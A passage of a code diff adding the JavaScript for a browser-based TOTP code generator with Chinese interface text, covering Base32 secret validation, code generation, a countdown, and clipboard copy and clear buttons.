+          if (!raw) {
+            lastCode = "";
+            lastSecret = "";
+            renderCode("");
+            metaEl.textContent = "输入密钥后自动生成";
+            copyBtn.disabled = true;
+            return;
+          }
+
+          if (!isValidBase32(raw)) {
+            lastCode = "";
+            lastSecret = "";
+            renderCode("");
+            metaEl.innerHTML =
+              '<span style="color:#dc2626">密钥格式不正确（需 Base32：A-Z、2-7，至少 8 位）</span>';
+            copyBtn.disabled = true;
+            return;
+          }
+
+          const myReq = ++reqId;
+          let code;
+          try {
+            code = await generateTOTP(secret, PERIOD, DIGITS);
+          } catch (e) {
+            return;
+          }
+          // 竞态保护：若有更新的请求，丢弃本次结果
+          if (myReq !== reqId) return;
+
+          const isNew = code !== lastCode || secret !== lastSecret;
+          lastCode = code;
+          lastSecret = secret;
+          renderCode(code);
+          copyBtn.disabled = false;
+          renderCountdown();
+
+          if (autoCopy && isNew) {
+            copyToClipboard(code).then(function (ok) {
+              if (ok && myReq === reqId) showCopied(true);
+            });
+          }
+        }
+
+        // 输入事件
+        secretInput.addEventListener("input", function () {
+          update(true);
+        });
+
+        // 一键清空
+        clearBtn.addEventListener("click", function () {
+          secretInput.value = "";
+          lastCode = "";
+          lastSecret = "";
+          reqId++;
+          secretInput.focus();
+          update(false);
+        });
+
+        // 手动复制
+        copyBtn.addEventListener("click", function () {
+          if (!lastCode) return;
+          copyToClipboard(lastCode).then(function (ok) {
+            if (ok) showCopied(false);
+          });
+        });
+
+        // 每秒检查倒计时与窗口切换
+        setInterval(function () {
+          if (!lastCode) return;
+          // 检测是否进入新窗口（验证码需要刷新）
+          // 简单方案：每秒重新生成，若变化则更新并自动复制
+          update(true);
+        }, 1000);
+
+        // 初始化
+        update(false);
+        secretInput.focus();
+      })();
     </script>
-    </body>
-    </html>
+  </body>
+</html>
